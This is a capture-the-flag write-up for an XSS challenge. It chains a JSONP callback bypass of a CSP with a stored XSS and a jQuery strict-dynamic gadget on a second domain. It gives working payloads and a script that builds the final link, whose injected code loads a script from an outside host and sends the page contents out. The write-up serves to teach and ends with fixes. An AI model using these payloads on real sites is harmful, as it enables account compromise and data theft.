#  Xmas Shopping Site 

This challenge is a standard XSS challenge setup: we are given a way to submit URLs and must steal data from the target domain (see the Stage2 link).
To solve it, we must find a way to execute JavaScript in the context of the target domain (cross-site scripting, or XSS in short).

## Stage 1: Bypassing the CSP

Navigating through the challenge site, we quickly discover that there is an XSS in the search response.
For example, visit http://xss.allesctf.net/?search=%3Cb%3Etest%3C/b%3E and observe that the text is bold.
Testing this some more, we can confirm that it is possible to inject arbitrary HTML.

We cannot inject scripts though. If we try that, we find that they are not executed: <http://xss.allesctf.net/?search=%3Cscript%3Ealert(1);%3C/script%3E> 
This is due to the [Content-Security-Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP) set by the site.
The CSP is a security policy that restricts the permissible sources for scripts.
In our case, the value of the CSP is `default-src 'self' http://*.xss.allesctf.net; object-src 'none'; base-uri 'none';`.
In particular, `unsafe-inline` is not part of that, so inline `<script>` tags won't be allowed.

To bypass this, we need to make use of another endpoint on the site.
To fetch the available items, the site requests `http://xss.allesctf.net/items.php?cb=parseItems`.
That endpoint then returns javascript that passes the items to the given *c*all*b*ack function.
This technique is known as [JSONP](https://en.wikipedia.org/wiki/JSONP).

We can use that endpoint to construct arbitrary scripts.
Since there is no validation on the cb parameter, we can just request `http://xss.allesctf.net/items.php?cb=alert(1);` which returns:

```
$ curl 'http://xss.allesctf.net/items.php?cb=alert(1);'
alert(1);([{"title": "Weihnachtsbaum", "url": "3.png", "text": "Plastik und voll schön."},{"title": "Christbaumkugel", "url": "1.png", "text": "Rund und bunt."},{"title": "Schlitten", "url": "2.png", "text": "Es ist glatt, er ist schnell!"}])
```

Then, we use the injection in the search function inject a `<script src=http://xss.allesctf.net/items.php?cb=alert(1);></script>` tag.
This is allowed by the CSP, because `default-src` allows scripts from `*.xss.allesctf.net` to be executed.
Here's a demo:  <http://xss.allesctf.net/?search=%3Cscript%20src=http://xss.allesctf.net/items.php?cb=alert(1);%3E%3C/script%3E>

## Stage 2: Pivoting to a second domain
We have successfully bypassed the CSP and can now execute arbitrary JavaScript in the context of the `xss.allesctf.net`.
But to get the flag requires us to be able to execute JavaScript on the `http://stage2.xss.allesctf.net` domain, since that's where the flag is displayed. 
Because it is a different domain, we cannot simply request the page (we're not allowed to read the result because of the [Same-Origin Policy](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy)).

The Same-Origin Policy only prevents reading the response.
It does not prevent making requests.
If we can find a way to trigger an XSS by using a request to the stage2 site, we can solve the challenge.

The stage2 site has a function to change the background image.
The way this works is that there is a hidden input field in the document source:

```
<input type="hidden" id="bg" value="green">
```

When the background is changed, a POST request to `/` is made with a form parameter called `bg`
that changes the value and the site is reloaded.
After the reload, the hidden input field will contain the new value.

Since the value of the `bg` parameter is not validated, this leads to a stored XSS.
We can test this by executing the following with the browser console:
```
$.post({
  url: window.location.href,
  xhrFields: { withCredentials: true },
  data: {"bg": '"><b>hello xss!</b>"'} 
}).then(() => location.reload())
```

Looking at the source of the site after executing that request, we see:

```
<input type="hidden" id="bg" value=""><b>hello xss!</b>"">
```

So we have successfully injected HTML.
However, there is again a Content-Security Policy preventing us from executing scripts.
This time, the policy is even more strict: `script-src 'nonce-GHiE/BHQYQOsRVYaUHl3cvd1NMg=' 'unsafe-inline' 'strict-dynamic'; base-uri 'none'; object-src 'none';`
Do not be fooled by the `unsafe-inline`, this is only for backwards compatibility with browsers that do not support the `nonce-` method.
Modern browsers (such as the one used in the challenge) that support `nonce-` ignore the `unsafe-inline`.
This means that in order to execute a script, we either need to supply the correct `nonce` or be loaded by an existing script (this is what `strict-dynamic` means).

Getting the nonce correct is impossible since we don't know it.
However, there is a way to abuse the existing code of the site to trick it into executing our own code.
Here's the part of the site's script that is executed when the page loads, in order to load the background:

```
$(document).ready(() => {
    $("body").append(backgrounds[$("#bg").val()]);
});
```

This uses jQuery's `append` function, which parses HTML and adds it to the DOM.
If we can make the argument to that be a `<script>OUR CODE</script>`, then our script will execute, because it is "loaded" by an existing script (thanks to `strict-dynamic`).

So we want to control the value of the expression `backgrounds[$("#bg").val()]`.
One way to do so is to make `$("#bg").val()` equal to `innerHTML` and then put our script into a div with id `backgrounds`, as follows:

```html
<input type="hidden" id="bg" value="innerHTML">
<div id="backgrounds"><script>alert(2);</script></div>
<!-- comment out the rest of the code that would usually set the backgrounds variable
```

We can test this with the following call in the browser console (we only inject the part after the the `value="` because that's where the server substitues our payload).

```
$.post({
    url: window.location.href,
    xhrFields: { withCredentials: true },
    data: {"bg": 'innerHTML"><div id="backgrounds"><script>alert(2);</script></div><!--'} 
}).then(() => location.reload())
```

This successfully shows an `alert(2)` prompt, confirming that we can bypass the CSP.

## Putting it together: the complete payload

Since the second XSS is a stored XSS triggered by a POST request, we can also trigger that from the first XSS.
For that, we simply make the first XSS perform the POST and then redirect to the stage2 site, like this:

```
$("a")[1].href;
$.post({url: l, data: {"bg": x.value}, xhrFields: {withCredentials: true}}).always(function() { document.location = l;});
```

Since the payload for the first stage is size-constrained, we place the actual `bg` payload in a variable named `x`. We can inject this together with the first XSS by creating an input with `id=x`:`

```
<input id="x" name="bg" value="INJECT2">
```

Here `INJECT2` is the value we want to set the `bg` value to.
I used a small script to construct the final payload:

```
FINAL_PAYLOAD = "<script src=http://dev.five.name></script>"
INJECT2 = '''
innerHTML"><div id="backgrounds">FINAL_PAYLOAD</div><!--
'''.strip().replace("FINAL_PAYLOAD", FINAL_PAYLOAD)

SRC1 = "http://xss.allesctf.net/items.php?cb=" + quote('l=$("a")[1].href;$.post({url: l, data: {"bg": x.value}, xhrFields: {withCredentials: true}}).always(function() { document.location = l;});');
INJECT1 = '''
<input id="x" name="bg" value="INJECT2">
<script defer src='SRC1'></script>
'''.replace("\n", "").replace("INJECT2", html.escape(INJECT2)).replace("SRC1", SRC1)

link = "http://xss.allesctf.net/?search=" + quote(INJECT1)

print(SRC1)
print("--")
print(link)
```

This generates the following link: `http://xss.allesctf.net/?search=%3Cinput%20id%3D%22x%22%20name%3D%22bg%22%20value%3D%22innerHTML%26quot%3B%26gt%3B%26lt%3Bdiv%20id%3D%26quot%3Bbackgrounds%26quot%3B%26gt%3B%26lt%3Bscript%20src%3Dhttp%3A//dev.five.name%26gt%3B%26lt%3B/script%26gt%3B%26lt%3B/div%26gt%3B%26lt%3B%21--%22%3E%3Cscript%20defer%20src%3D%27http%3A//xss.allesctf.net/items.php%3Fcb%3Dl%253D%2524%2528%2522a%2522%2529%255B1%255D.href%253B%2524.post%2528%257Burl%253A%2520l%252C%2520data%253A%2520%257B%2522bg%2522%253A%2520x.value%257D%252C%2520xhrFields%253A%2520%257BwithCredentials%253A%2520true%257D%257D%2529.always%2528function%2528%2529%2520%257B%2520document.location%2520%253D%2520l%253B%257D%2529%253B%27%3E%3C/script%3E`

The payload will fetch a script to execute from `dev.five.name`.
If we put a script to do `document.location="http://dev.five.name/" + document.body.innerHTML` there and then submit the link, we find the flag in the webserver access logs: `CSCG{c0ngratZ_y0u_l3arnD_sUm_jS:>}`

## Mitigation

The XSS exploited in stage 1 should be fixed by a) escaping the query in the search response and b) applying a whitelist on valid JSONP callbacks.
For the second issue, there should be a whitelist on the allowed background names, since they are statically known. Removing all possible gadgets that allow `strict-dynamic` bypass is probably not so feasible, if you still want to use jQuery. But you could still avoid building a DOM from strings, by using the browser APIs to properly construct the DOM.
